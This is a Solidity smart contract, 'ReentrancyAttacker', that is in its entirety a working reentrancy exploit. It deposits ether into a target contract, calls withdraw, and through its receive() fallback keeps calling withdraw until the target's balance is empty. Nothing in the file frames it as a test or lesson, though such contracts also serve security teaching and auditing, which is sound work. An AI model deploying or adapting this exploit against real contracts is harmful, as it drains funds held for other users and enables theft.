pragma solidity ^0.8.19;

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVulnerable public vulnerableContract;
    
    constructor(address _vulnerableAddress) {
        vulnerableContract = IVulnerable(_vulnerableAddress);
    }

    function deposit() public payable {
        vulnerableContract.deposit{value: msg.value}();
    }

    function attack() public {
        vulnerableContract.withdraw();
    }

    receive() external payable {
        if (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw();
        }
    }
}
